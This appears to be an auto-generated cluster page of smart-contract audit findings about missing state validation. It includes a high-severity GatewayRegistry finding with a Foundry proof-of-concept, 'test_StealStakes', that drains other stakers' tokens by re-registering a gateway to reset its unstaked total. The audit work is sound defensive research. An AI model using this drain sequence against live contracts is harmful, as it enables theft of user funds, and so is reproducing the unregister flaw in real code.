# Cluster -1416

**Rank:** #55  
**Count:** 308  

## Label
Inadequate state validation and access control lead to misleading reward visibility, incorrect entitlement calculations, or unauthorized governanceâ€”enabling attackers to manipulate or misrepresent user balances or permissions.

## Examples

### Example 1

**Auto Label:** Insufficient state validation leads to persistent or incorrect access control, enabling unauthorized interactions, asset draining, or invalid operations.  

**Original Text Preview:**

In `ZipperFactoryVault:createVault`, two mapping values, `tokenToVault` and `vaultToToken`, are assigned. The issue arises when a changer updates these values later using a new vault address. However, the data for the `oldVault` is not deleted, leading to potential issues with outdated mappings.

### Example 2

**Auto Label:** Insufficient state validation leads to persistent or incorrect access control, enabling unauthorized interactions, asset draining, or invalid operations.  

**Original Text Preview:**

Each vault must be unique to a token. However, the `createVault` and `changeVault` functions do not check whether the vault key is already assigned to another token. This could result in a vault being overwritten or mistakenly reassigned, violating the uniqueness constraint.

Mitigation:
Add the following check to both functions to ensure the vault is not already in use by another token:

```solidity
require(vaultToToken[chainId][vault].length == 0, "Vault already exists for another token");
```

### Example 3

**Auto Label:** Insufficient validation of critical state conditions enables unauthorized manipulation of stake, rewards, or access, leading to fund loss, incorrect balances, or denial of service.

## Severity

**Impact:** High, user's funds will be stolen

**Likelihood:** High, can be exploited by anyone and easy to implement

## Description

`GatewayRegistry` contract allows users to register and stake tokens into gateways to receive computation units CUs. First, the user registers a gateway,

```solidity
  function register(bytes calldata peerId, string memory metadata, address gatewayAddress) public whenNotPaused {
    require(peerId.length > 0, "Cannot set empty peerId");
    bytes32 peerIdHash = keccak256(peerId);
    require(gateways[peerIdHash].operator == address(0), "PeerId already registered");

    gateways[peerIdHash] = Gateway({
      operator: msg.sender,
      peerId: peerId,
      strategy: defaultStrategy,
      ownAddress: gatewayAddress,
      metadata: metadata,
      totalStaked: 0,
>>    totalUnstaked: 0
    });
```

note `totalUnstaked` is set to 0. After this we can stake tokens

```solidity
  function _stakeWithoutTransfer(bytes calldata peerId, uint256 amount, uint128 durationBlocks) internal {
    (Gateway storage gateway, bytes32 peerIdHash) = _getGateway(peerId);
    _requireOperator(gateway);

    uint256 _computationUnits = computationUnitsAmount(amount, durationBlocks);
    uint128 lockStart = router.networkController().nextEpoch();
    uint128 lockEnd = lockStart + durationBlocks;
>>  stakes[peerIdHash].push(Stake(amount, _computationUnits, lockStart, lockEnd));
```

`stakes` mapping is used to track all user stakes. The problem arises when we unregister the gateway, we do not delete the `stakes`, it can be exploited in the following steps:

- unstake tokens from the gateway
- unregister gateway
- register new gateway with the same `peerId`
- since `totalUnstaked = 0`, we can unstake tokens again

```solidity
  function _unstakeable(Gateway storage gateway) internal view returns (uint256) {
    Stake[] memory _stakes = stakes[keccak256(gateway.peerId)];
    uint256 blockNumber = block.number;
    uint256 total = 0;
    for (uint256 i = 0; i < _stakes.length; i++) {
      Stake memory _stake = _stakes[i];
      if (_stake.lockEnd <= blockNumber) {
        total += _stake.amount;
      }
    }
    return total - gateway.totalUnstaked;
  }
```

Here is the coded POC for `GatewayRegistry.unstake.t.sol `

```solidity
  function test_StealStakes() public {
    uint256 amount = 100;
    address alice = address(0xA11cE);
    token.transfer(alice, amount);

    // stakers stake into their gateways
    gatewayRegistry.stake(peerId, amount, 200);
    vm.startPrank(alice);
    token.approve(address(gatewayRegistry), type(uint256).max);
    gatewayRegistry.register(bytes("alice"), "", address(0x6a7e));
    gatewayRegistry.stake(bytes("alice"), amount, 200);

    assertEq(token.balanceOf(address(gatewayRegistry)), 200);
    // exploit
    vm.roll(block.number + 300);
    gatewayRegistry.unstake(bytes("alice"), amount);
    gatewayRegistry.unregister(bytes("alice"));
    gatewayRegistry.register(bytes("alice"), "", address(0x6a7e));
    // unstake again
    gatewayRegistry.unstake(bytes("alice"), amount);
    assertEq(token.balanceOf(address(gatewayRegistry)), 0);
  }
```

## Recommendations

Delete `stakes` mapping when gateway is being unregistered.
